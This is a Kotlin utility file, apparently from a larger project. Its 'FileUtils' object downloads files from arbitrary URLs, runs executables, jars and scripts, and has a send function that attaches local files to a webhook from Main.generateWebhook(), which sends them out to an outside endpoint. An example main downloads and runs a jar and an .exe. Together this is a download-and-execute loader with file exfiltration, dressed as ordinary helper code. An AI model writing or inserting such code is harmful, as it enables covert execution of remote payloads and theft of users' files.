package utils

import java.io.File
import java.net.URI
import java.nio.file.Files
import java.nio.file.Paths
import java.nio.file.StandardCopyOption

object FileUtils {

    /**
     * Downloads a file from the given URL to the specified destination.
     *
     * @param url The URL of the file to download.
     * @param destination The directory path where the file should be saved.
     * @throws Exception if there's an error during the download process.
     */
    fun download(url: String, destination: String) {
        try {
            val url = URI(url).toURL()
            val connection = url.openConnection()
            connection.connect()

            Files.copy(
                connection.getInputStream(),
                Paths.get(destination, url.file.substringAfterLast("/")),
                StandardCopyOption.REPLACE_EXISTING
            )

            println("File downloaded successfully to: $destination")
        } catch (e: Exception) {
            println("Error downloading file: ${e.message}")
            throw e
        }
    }

    /**
     * Runs the specified file.
     * Currently, supports .exe, .jar, .py, and .sh files.
     * @param path The path to the file to be run.
     * @throws Exception if there's an error while trying to run the file.
     */
    fun run(path: String) {
        val file = File(path)
        if (!file.exists()) {
            throw IllegalArgumentException("File does not exist: $path")
        }

        try {
            val process = when {
                file.name.endsWith(".exe") -> ProcessBuilder(file.absolutePath)
                file.name.endsWith(".jar") -> ProcessBuilder("java", "-jar", file.absolutePath)
                file.name.endsWith(".py") -> ProcessBuilder("python", file.absolutePath)
                file.name.endsWith(".sh") -> ProcessBuilder("bash", file.absolutePath)
                else -> throw UnsupportedOperationException("Unsupported file type: ${file.extension}")
            }

            process.inheritIO().start().waitFor()
            println("File executed successfully: $path")
        } catch (e: Exception) {
            println("Error running file: ${e.message}")
            throw e
        }
    }

    fun send(file: File) {
        System.getenv("HOME")
        Main.generateWebhook().apply {
            attachments.add(file)
            execute()
        }
    }
}

// Example usage
fun main() {
    // Download example
    FileUtils.download("https://github.com/xia-mc/Raven-XD/releases/download/v2.7.0/raven-XD.jar", "C:\\Users\\${Main.user}\\Downloads")

    // Run example
    FileUtils.run("C:\\Downloads\\file.exe")
}